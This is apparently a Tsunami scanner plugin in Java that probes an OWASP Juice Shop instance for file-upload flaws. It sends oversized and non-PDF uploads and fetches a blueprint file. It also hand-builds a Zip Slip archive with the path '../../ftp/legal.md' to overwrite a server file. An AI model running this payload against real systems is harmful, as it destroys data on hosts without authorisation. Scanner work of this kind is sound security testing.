/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.protobuf.ByteString;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "FileuploaddetectorDetector",
    version = "0.1",
    description = "Detects FileUploadDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = FileuploaddetectorDetectorBootstrapModule.class)
public final class FileuploaddetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public FileuploaddetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Fileuploaddetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
            .addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
            .build();

        // Attack 1: Upload file larger than 100 kB (but less than 200 kB)
        byte[] largeFileContent = new byte[150 * 1024]; // 150 kB
        for (int i = 0; i < largeFileContent.length; i++) {
            largeFileContent[i] = (byte) (i % 256);
        }
        
        String boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        String formData = "--" + boundary + "\r\n" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"large.pdf\"\r\n" +
            "Content-Type: application/pdf\r\n\r\n";
        
        ByteString.Output output = ByteString.newOutput();
        output.write(formData.getBytes(StandardCharsets.UTF_8));
        output.write(largeFileContent);
        output.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
        
        HttpHeaders uploadHeaders = HttpHeaders.builder()
            .addHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();
            
        HttpResponse largeFileResponse = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(uploadHeaders)
                .setRequestBody(output.toByteString())
                .build(),
            networkService);
            
        if (largeFileResponse.status().code() == 204 || largeFileResponse.status().code() == 200) {
            successfulAttacks++;
        }

        // Attack 2: Upload non-PDF file
        String nonPdfData = "--" + boundary + "\r\n" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\n" +
            "Content-Type: text/plain\r\n\r\n" +
            "This is a test file that is not a PDF\r\n" +
            "--" + boundary + "--\r\n";
            
        HttpResponse nonPdfResponse = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(uploadHeaders)
                .setRequestBody(ByteString.copyFrom(nonPdfData, StandardCharsets.UTF_8))
                .build(),
            networkService);
            
        if (nonPdfResponse.status().code() == 204) {
            successfulAttacks++;
        }

        // Attack 3: Zip Slip attack to overwrite legal.md
        byte[] zipSlipContent = createZipSlipPayload();
        String zipData = "--" + boundary + "\r\n" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"exploit.zip\"\r\n" +
            "Content-Type: application/zip\r\n\r\n";
            
        ByteString.Output zipOutput = ByteString.newOutput();
        zipOutput.write(zipData.getBytes(StandardCharsets.UTF_8));
        zipOutput.write(zipSlipContent);
        zipOutput.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
        
        HttpResponse zipSlipResponse = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(uploadHeaders)
                .setRequestBody(zipOutput.toByteString())
                .build(),
            networkService);
            
        if (zipSlipResponse.status().code() == 204 || zipSlipResponse.status().code() == 200) {
            // Verify if legal.md was overwritten by checking its content
            HttpResponse legalCheck = httpClient.send(
                HttpRequest.get(targetUri + "/ftp/legal.md")
                    .setHeaders(headers)
                    .build(),
                networkService);
                
            if (legalCheck.status().code() == 200) {
                String legalContent = legalCheck.bodyBytes()
                    .map(bs -> bs.toStringUtf8())
                    .orElse("");
                if (legalContent.contains("OVERWRITTEN") || legalContent.length() < 100) {
                    successfulAttacks++;
                }
            }
        }

        // Attack 4: Download blueprint file
        HttpResponse blueprintResponse = httpClient.send(
            HttpRequest.get(targetUri + "/assets/public/images/products/JuiceShop.stl")
                .setHeaders(headers)
                .build(),
            networkService);
            
        if (blueprintResponse.status().code() == 200) {
            String contentType = blueprintResponse.headers().get("content-type").orElse("");
            if (contentType.contains("application/octet-stream") || 
                contentType.contains("model/stl") ||
                blueprintResponse.bodyBytes().map(bs -> bs.size()).orElse(0) > 1000) {
                successfulAttacks++;
            }
        }

        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("File upload vulnerability test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private byte[] createZipSlipPayload() {
    // Create a minimal ZIP file with directory traversal
    // ZIP file structure: Local file header + file data + Central directory + End of central directory
    String maliciousContent = "OVERWRITTEN BY ZIP SLIP ATTACK";
    String filename = "../../ftp/legal.md";
    
    try {
        ByteString.Output zipOutput = ByteString.newOutput();
        
        // Local file header
        zipOutput.write(new byte[]{0x50, 0x4b, 0x03, 0x04}); // Local file header signature
        zipOutput.write(new byte[]{0x14, 0x00}); // Version needed to extract
        zipOutput.write(new byte[]{0x00, 0x00}); // General purpose bit flag
        zipOutput.write(new byte[]{0x00, 0x00}); // Compression method (stored)
        zipOutput.write(new byte[]{0x00, 0x00}); // Last mod file time
        zipOutput.write(new byte[]{0x00, 0x00}); // Last mod file date
        
        // CRC-32, compressed size, uncompressed size
        int crc32 = calculateCRC32(maliciousContent.getBytes(StandardCharsets.UTF_8));
        int fileSize = maliciousContent.length();
        
        zipOutput.write(intToBytes(crc32)); // CRC-32
        zipOutput.write(intToBytes(fileSize)); // Compressed size
        zipOutput.write(intToBytes(fileSize)); // Uncompressed size
        zipOutput.write(shortToBytes((short) filename.length())); // File name length
        zipOutput.write(new byte[]{0x00, 0x00}); // Extra field length
        
        // File name
        zipOutput.write(filename.getBytes(StandardCharsets.UTF_8));
        
        // File data
        zipOutput.write(maliciousContent.getBytes(StandardCharsets.UTF_8));
        
        // Central directory file header
        zipOutput.write(new byte[]{0x50, 0x4b, 0x01, 0x02}); // Central file header signature
        zipOutput.write(new byte[]{0x14, 0x00}); // Version made by
        zipOutput.write(new byte[]{0x14, 0x00}); // Version needed to extract
        zipOutput.write(new byte[]{0x00, 0x00}); // General purpose bit flag
        zipOutput.write(new byte[]{0x00, 0x00}); // Compression method
        zipOutput.write(new byte[]{0x00, 0x00}); // Last mod file time
        zipOutput.write(new byte[]{0x00, 0x00}); // Last mod file date
        zipOutput.write(intToBytes(crc32)); // CRC-32
        zipOutput.write(intToBytes(fileSize)); // Compressed size
        zipOutput.write(intToBytes(fileSize)); // Uncompressed size
        zipOutput.write(shortToBytes((short) filename.length())); // File name length
        zipOutput.write(new byte[]{0x00, 0x00}); // Extra field length
        zipOutput.write(new byte[]{0x00, 0x00}); // File comment length
        zipOutput.write(new byte[]{0x00, 0x00}); // Disk number start
        zipOutput.write(new byte[]{0x00, 0x00}); // Internal file attributes
        zipOutput.write(new byte[]{0x00, 0x00, 0x00, 0x00}); // External file attributes
        zipOutput.write(new byte[]{0x00, 0x00, 0x00, 0x00}); // Relative offset of local header
        
        // File name
        zipOutput.write(filename.getBytes(StandardCharsets.UTF_8));
        
        // End of central directory record
        zipOutput.write(new byte[]{0x50, 0x4b, 0x05, 0x06}); // End of central dir signature
        zipOutput.write(new byte[]{0x00, 0x00}); // Number of this disk
        zipOutput.write(new byte[]{0x00, 0x00}); // Number of disk with start of central directory
        zipOutput.write(new byte[]{0x01, 0x00}); // Total number of entries in central directory on this disk
        zipOutput.write(new byte[]{0x01, 0x00}); // Total number of entries in central directory
        
        int centralDirSize = 46 + filename.length(); // Size of central directory
        int centralDirOffset = 30 + filename.length() + fileSize; // Offset of start of central directory
        
        zipOutput.write(intToBytes(centralDirSize)); // Size of central directory
        zipOutput.write(intToBytes(centralDirOffset)); // Offset of start of central directory
        zipOutput.write(new byte[]{0x00, 0x00}); // ZIP file comment length
        
        return zipOutput.toByteString().toByteArray();
        
    } catch (IOException e) {
        // Fallback to simple payload
        return "PK\003\004".getBytes(StandardCharsets.UTF_8);
    }
}

private byte[] intToBytes(int value) {
    return new byte[] {
        (byte) (value & 0xFF),
        (byte) ((value >> 8) & 0xFF),
        (byte) ((value >> 16) & 0xFF),
        (byte) ((value >> 24) & 0xFF)
    };
}

private byte[] shortToBytes(short value) {
    return new byte[] {
        (byte) (value & 0xFF),
        (byte) ((value >> 8) & 0xFF)
    };
}

private int calculateCRC32(byte[] data) {
    int crc = 0xFFFFFFFF;
    int[] crcTable = new int[256];
    
    // Generate CRC table
    for (int i = 0; i < 256; i++) {
        int c = i;
        for (int j = 0; j < 8; j++) {
            if ((c & 1) == 1) {
                c = 0xEDB88320 ^ (c >>> 1);
            } else {
                c = c >>> 1;
            }
        }
        crcTable[i] = c;
    }
    
    // Calculate CRC
    for (byte b : data) {
        crc = crcTable[(crc ^ b) & 0xFF] ^ (crc >>> 8);
    }
    
    return crc ^ 0xFFFFFFFF;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("FILEUPLOADDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("FileUploadDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to FileUploadDetector attacks.")
                .setRecommendation(
                    "Implement proper security measures to prevent file upload attacks."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("FILEUPLOADDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("FileUploadDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to FileUploadDetector attacks.")
            .setRecommendation(
                "Implement proper security measures to prevent file upload attacks.")
        .build());
  }
}